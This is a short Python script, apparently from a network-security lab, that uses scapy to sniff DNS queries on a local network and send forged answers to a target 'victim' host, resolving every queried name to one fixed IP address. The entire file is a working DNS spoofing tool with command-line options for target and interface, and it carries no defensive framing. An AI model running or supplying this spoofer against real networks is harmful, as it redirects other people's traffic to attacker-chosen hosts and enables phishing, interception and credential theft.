#! /usr/bin/env python3

from scapy.all import *
import argparse

def dns_responder(local_ip: str, victim_ip: str, router_ip: str):

    def get_response(pkt: IP):
        if (
            DNS in pkt and
            pkt[DNS].opcode == 0 and
            pkt[DNS].ancount == 0
        ):
            if str(pkt["DNS Question Record"].qname):
                spf_resp = (IP(dst=victim_ip)/UDP(dport=pkt[UDP].sport,sport=53)/DNS(id=pkt[DNS].id,ancount=1,qd=DNSQR(qname=pkt[DNSQR].qname),an=DNSRR(rrname=pkt[DNSQR].qname,rdata="142.232.230.10")))
                send(spf_resp)
                print(spf_resp.show())
                return f"Spoofed DNS Response Sent: {pkt[IP].src}"

    return get_response


if __name__ == "__main__":
    BPF_FILTER = f"udp port 53"
    dns_responder_ip = "192.168.0.108"
    dns_spoof_victim_ip = '192.168.0.107'
    router_ip = '192.168.0.1'

    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--responder", dest="dns_responder_ip", help="DNS Responder IP")
    parser.add_argument("-t", "--target", dest="target_ip", help="DNS Spoof Victim IP")
    parser.add_argument("-i", "--interface", dest="network_interface", help="Network Interface")
    args=parser.parse_args()

    dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"
    dns_spoof_victim_ip = args.target_ip if args.target_ip else "192.168.0.108"
    network_interface = args.network_interface if args.network_interface else "enp0s3"
    dns_responder_ip = args.dns_responder_ip if args.dns_responder_ip else "192.168.0.108"

    sniff(filter=BPF_FILTER, prn=dns_responder(dns_responder_ip, dns_spoof_victim_ip, router_ip), iface=network_interface)
